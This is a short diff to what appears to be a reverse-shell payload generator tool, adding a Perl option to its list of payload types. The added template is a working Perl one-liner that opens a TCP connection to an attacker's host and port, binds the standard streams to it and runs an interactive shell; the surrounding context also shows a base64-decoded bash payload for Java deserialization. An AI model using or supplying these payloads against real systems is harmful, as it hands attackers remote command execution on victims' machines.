@@ -39,6 +39,7 @@ parser.add_argument('-e', '--payload', dest='payload', action='store', type=int,
 15 - Node.js sh
 16 - Node.js bash
 17 - Java deserialization bash
+18 - Perl
 
 ''', default=1)
 
@@ -122,8 +123,12 @@ p.waitFor();
 # Java Deserialization Bash 17
 '''
 bash -c {echo,{base_64_rev}}|{base64,-d}|{bash,-i}
-'''
+''',
 
+# Perl sh 18
+'''
+perl -e 'use Socket;$i="{local_host}";$p={local_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+'''
 )
 
 ################
